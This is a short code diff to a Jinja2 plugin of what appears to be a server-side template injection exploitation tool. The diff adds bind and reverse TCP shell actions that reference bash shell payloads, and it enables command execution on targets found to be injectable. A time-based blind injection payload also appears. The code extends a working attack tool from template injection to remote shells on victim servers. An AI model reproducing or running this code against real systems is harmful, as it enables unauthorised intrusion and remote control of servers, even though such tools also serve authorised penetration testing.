@@ -47,6 +47,14 @@ class Jinja2(Plugin):
         'evaluate_blind' : {
             'call': 'evaluate',
             'evaluate_blind': """%(code)s and __import__('time').sleep(%(delay)i)"""
+        },
+        'tcp_shell' : {
+            'call' : 'execute',
+            'tcp_shell': languages.bash_tcp_shell
+        },
+        'reverse_tcp_shell' : {
+            'call': 'execute',
+            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
         }
 
     }
@@ -84,6 +92,7 @@ class Jinja2(Plugin):
             self.set('language', 'python')
             self.set('engine', 'jinja2')
             self.set('evaluate', 'python')
+            self.set('execute', True)
 
     def detect_eval(self):
 
@@ -105,5 +114,6 @@ class Jinja2(Plugin):
             return
 
         self.set('language', 'python')
+        self.set('execute', True)
         self.set('engine', 'jinja2')
         self.set('evaluate', 'python')
